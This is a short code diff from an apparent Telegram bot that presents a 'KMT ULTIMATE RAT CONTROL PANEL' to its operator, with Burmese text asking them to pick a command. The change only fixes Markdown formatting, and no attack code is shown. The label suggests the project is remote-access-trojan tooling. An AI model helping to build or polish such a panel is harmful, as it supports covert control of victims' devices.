@@ -60,7 +60,7 @@ def send_control_panel(message):
     
     bot.send_message(
         message.chat.id, 
-        "🔥 **KMT ULTIMATE RAT CONTROL PANEL** 🔥\n\nလိုအပ်သော အမိန့် (Command) ကို ရွေးချယ်ပါ:", 
+        "🔥 *KMT ULTIMATE RAT CONTROL PANEL* 🔥\n\nလိုအပ်သော အမိန့် (Command) ကို ရွေးချယ်ပါ:", 
         reply_markup=markup,
         parse_mode="Markdown"
     )
